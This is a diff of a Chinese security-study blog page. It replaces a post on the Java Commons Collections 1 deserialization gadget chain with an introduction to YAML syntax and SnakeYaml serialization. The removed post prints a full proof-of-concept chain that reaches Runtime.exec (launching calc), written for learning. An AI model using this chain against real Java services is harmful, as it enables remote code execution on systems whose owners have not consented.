@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>java反序列化CC1-2 | fmyyy</title>
+  <title>yaml反序列化-1 yaml基础 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
+  <meta name="description" content="yaml反序列化-1 yaml基础yaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。 在Java中，有一个用于解析YAML格式的库，即SnakeYaml。 SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java反序列化CC1-2">
-<meta property="og:url" content="https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/index.html">
+<meta property="og:title" content="yaml反序列化-1 yaml基础">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/01/20/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
+<meta property="og:description" content="yaml反序列化-1 yaml基础yaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。 在Java中，有一个用于解析YAML格式的库，即SnakeYaml。 SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8&#x2F;UTF-16，支">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2021-09-02T13:14:04.000Z">
-<meta property="article:modified_time" content="2021-09-22T01:29:43.969Z">
+<meta property="article:published_time" content="2022-01-19T17:05:04.000Z">
+<meta property="article:modified_time" content="2022-01-19T17:07:53.727Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">java反序列化CC1-2</h1>
+                <h1 class="kratos-entry-title text-center">yaml反序列化-1 yaml基础</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-09-02</li>
+                <li><i class="fa fa-calendar"></i> 2022-01-20</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~3.32K
+                        ~2.19K
                     
                     字
                 </li>
@@ -190,25 +190,51 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1632274183969"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1642612073727"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-number">1.</span> <span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-yaml%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">yaml反序列化-1 yaml基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">yaml简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E8%AF%AD%E6%B3%95"><span class="toc-number">1.3.</span> <span class="toc-text">yaml语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.</span> <span class="toc-text">SnakeYaml反序列化</span></a></li></ol></li></ol>
                 </div>
             
             <hr />
-            <p>﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？<br>看看p神给的poc</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>不过这个poc我本地算是弹失败了，因为java版本的原因，在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用。我的版本正好是8u71。<br>不过我来学习思路，也懒的改版本了。</p>
-<h2 id="sun-reflect-annotation-AnnotationInvocationHandler"><a href="#sun-reflect-annotation-AnnotationInvocationHandler" class="headerlink" title="sun.reflect.annotation.AnnotationInvocationHandler"></a>sun.reflect.annotation.AnnotationInvocationHandler</h2><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可 以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。<br>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler<br>源码就不放了，逻辑就是调用了setValue方法，这个方法也能触发TransformedMap里注册的<br>Transform。</p>
-<h2 id="关于反射的问题"><a href="#关于反射的问题" class="headerlink" title="关于反射的问题"></a>关于反射的问题</h2><p>看到前面我们生产Runtime类的时候是直接调用getRuntime方法的<br>[<img src="https://img-blog.csdnimg.cn/img_convert/5d12afa2cd8fbf46ca0f305c5210fbe3.png"></p>
-<p>但这次的poc不一样，是利用反射调用的</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/5f88e181dadd76d98e0d386aad425ca2.png"></p>
-<p>这里涉及到反序列化的条件。<br>1、该类必须直接实现java.io.Serializable接口或者间接从其继承树中实现该接口(也就是他的某个父类实现了这个接口);<br>2、对于该类的所有无法序列化的属性(本文指字段field, 而不是严格意义上的属性property, 下同)必须使用transient修饰。</p>
-<p>但Runtime类是没有实现java.io.Serializable接口的，所以不能直接反序列化，但反射能解决这个问题，将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个<br>java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p>
-<p>但是AnnotationInvocationHandler 也不能直接实例化，仍然需要利用反射的机制</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>真累，接下来是CC1的LazyMap，比起TransformedMap似乎LazyMap用的更多</p>
+            <h1 id="yaml反序列化-1-yaml基础"><a href="#yaml反序列化-1-yaml基础" class="headerlink" title="yaml反序列化-1 yaml基础"></a>yaml反序列化-1 yaml基础</h1><h2 id="yaml简介"><a href="#yaml简介" class="headerlink" title="yaml简介"></a>yaml简介</h2><p>YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。</p>
+<p>在Java中，有一个用于解析YAML格式的库，即SnakeYaml。</p>
+<p>SnakeYaml是一个完整的YAML1.1规范Processor，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>全版本SnakeYaml</p>
+<p>这里用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="yaml语法"><a href="#yaml语法" class="headerlink" title="yaml语法"></a>yaml语法</h2><p>大小写敏感</p>
+<p>使用缩进代表层级关系（缩进只能用空格）</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">AA:</span></span><br><span class="line">    <span class="attr">A:</span></span><br><span class="line">        <span class="attr">a:</span> <span class="string">b</span></span><br><span class="line">        <span class="attr">c:</span> <span class="string">d</span></span><br><span class="line"><span class="attr">BB:</span></span><br><span class="line">    <span class="attr">C:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">a</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">b</span></span><br></pre></td></tr></table></figure>
+
+<p>对象格式为 key: value 冒号之后有一个空格</p>
+<p>一个短横线加一个空格代表一个数组项</p>
+<p>还有一种结构为常量</p>
+<p>包括：整数，浮点数，字符串，NULL，日期，布尔，时间。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2018-02-17</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2018-02-17T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h2><p>Yaml.load(): 参数为字符串或文件，反序列化返回一个java对象</p>
+<p>Yaml.dump(): 将一个对象转为yaml文件形式</p>
+<p>序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;User1&quot;</span>);</span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        String s = yaml.dump(user);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.le1a.com/2022/01/18/06169702288b7.png" alt="1642516720309.png"></p>
+<p>!!为强制类型转换为User类。</p>
+<p>反序列化：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String string = <span class="keyword">new</span> String(<span class="string">&quot;!!yaml.User &#123;name: User1&#125;&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(string);</span></span><br><span class="line">        Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">        User user = yaml.load(string);</span><br><span class="line">        System.out.println(user);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.le1a.com/2022/01/18/3edadeafd5513.png" alt="1642517009415.png"></p>
+<p>成功反序列化User对象。</p>
 
         </div>
         
@@ -262,7 +288,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/",
+                text: "https://fmyyy.gitee.io/2022/01/20/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -274,10 +300,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/";
-            const title         = "「java反序列化CC1-2」";
-            const excerpt       = `﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc
-1234567891011121314151617181920212223242526272829303132333435363...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/01/20/yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/";
+            const title         = "「yaml反序列化-1 yaml基础」";
+            const excerpt       = `yaml反序列化-1 yaml基础yaml简介YAML是”YAML Ain’t a Markup Language”（YAML不是一种标记语言）的递归缩写，是一个可读性高、用来表达数据序列化的格式，类似于XML但比XML更简洁。
+在J...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -299,7 +325,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2021-09-22</span>
+                <span>最后编辑：2022-01-20</span>
                 </div>
             </div>
         </footer>
@@ -308,13 +334,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" java反序列化CC1-1" href="/2021/09/01/java反序列化CC1-1/">&lt; 上一篇</a>
+                <a title=" java类加载机制" href="/2022/01/19/java类加载机制/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" java反序列化CC1-3" href="/2021/09/03/java反序列化CC1-3/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -356,7 +378,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#yaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1-yaml%E5%9F%BA%E7%A1%80"><span class="toc-text">yaml反序列化-1 yaml基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E7%AE%80%E4%BB%8B"><span class="toc-text">yaml简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yaml%E8%AF%AD%E6%B3%95"><span class="toc-text">yaml语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">SnakeYaml反序列化</span></a></li></ol></li></ol>
     </div>
 </aside>
                 
